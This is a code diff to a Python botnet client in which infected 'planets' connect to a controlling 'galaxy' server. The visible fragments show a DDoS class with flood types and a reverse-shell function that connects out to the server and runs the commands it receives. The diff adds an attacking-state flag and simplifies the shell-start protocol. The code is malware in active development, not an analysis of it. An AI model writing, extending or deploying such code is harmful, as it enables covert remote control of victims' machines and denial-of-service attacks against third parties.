@@ -27,6 +27,7 @@ else:
 
 # functions
 class DDoS:
+    planet_attacking = False
     def __init__(self, target_ip, target_port, flood_type):
         self.target_ip = target_ip
         self.target_port = target_port
@@ -130,7 +131,7 @@ def connect_to_galaxy():
             time.sleep(5)
 
 
-def shell(shell_buf_size):
+def shell():
     """Process incoming reverse shell commands from galaxy."""
     shell_socket = socket.socket()
     shell_socket.connect((galaxy_ip, shell_port))
@@ -138,7 +139,7 @@ def shell(shell_buf_size):
     shell_socket.send(cwd.encode())
     while not planet_shutting_down:
         shell_cmds = []
-        shell_cmd = shell_socket.recv(shell_buf_size).decode()
+        shell_cmd = shell_socket.recv(128 * 1024).decode()
         if shell_cmd.lower() == "exit":
             break
         if "&&" in shell_cmd and ";" not in shell_cmd:
@@ -210,10 +211,9 @@ def connection_handler():
                 elif "planet ID: " in data:
                     planet_id = data.replace("planet ID: ", "").strip()
                     print(f"Recieved planet ID: {planet_id}")
-                    print(data)
-                elif "shellcmd start bufsize " in data:
+                elif data == "shell start":
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
-                    shell(int(data.replace("shellcmd start bufsize ", "").strip()))
+                    shell()
                 elif not data:
                     print("Having trouble connecting to galaxy, attempting to reconnect...")
                     planet_online = False
